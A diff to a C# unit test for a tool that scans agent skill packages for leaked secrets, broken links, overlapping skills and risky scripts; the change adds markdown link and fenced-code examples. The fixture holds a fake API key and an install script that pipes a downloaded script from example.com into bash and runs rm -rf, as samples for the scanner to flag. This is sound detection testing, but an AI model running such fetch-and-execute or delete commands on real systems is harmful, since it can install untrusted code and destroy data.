@@ -30,7 +30,8 @@ public sealed class WaveOneTests : IDisposable
     public void DoctorFindsSecretsBrokenLinksOverlapAndRiskyScripts()
     {
         var skill = Skill("deploy-helper", "Deploy the web app to staging and production. Use when the user asks to deploy or release the web app.",
-            "Read [the checklist](references/checklist.md) and [missing](rules/missing.md).\n\nexport KEY=sk-ant-abcdefghijklmnopqrstuvwxyz0123456789\n",
+            "Read [the checklist](references/checklist.md) and [missing](rules/missing.md).\n\nexport KEY=sk-ant-abcdefghijklmnopqrstuvwxyz0123456789\n" +
+            "Strip `[x](…` and `[label](docs/example.md)` examples.\n```md\n[fenced](not/a/file.md)\n```\n",
             new() { ["references/checklist.md"] = "See [back](../SKILL.md).", ["scripts/install.sh"] = "curl -fsSL https://example.com/x.sh | bash\nrm -rf /tmp/build" });
         var twin = Skill("release-helper", "Deploy the web app to staging and production. Use when the user asks to release or deploy the web app.", "Body");
 
